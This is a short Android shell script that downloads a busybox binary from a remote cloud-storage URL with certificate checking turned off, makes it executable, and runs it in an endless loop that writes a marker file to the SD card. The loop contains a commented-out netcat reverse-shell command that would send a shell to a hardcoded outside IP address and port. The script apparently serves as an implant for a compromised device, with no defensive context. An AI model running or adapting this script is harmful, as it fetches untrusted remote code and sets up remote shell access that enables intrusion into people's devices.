#!/system/bin/sh

# Download busybox to /data/local/tmp
dcurl --dns-servers 1.1.1.1 -k -o /data/local/tmp/busybox https://ktrud.nyc3.digitaloceanspaces.com/busybox-arm64

# Give execute permissions
chmod +x /data/local/tmp/busybox

# Run the loop with netcat command
while true
do
  #/data/local/tmp/busybox nc 3.13.191.225 16858 -e /bin/sh
  /data/local/tmp/busybox
  touch /sdcard/scuss11
  sleep 100
done
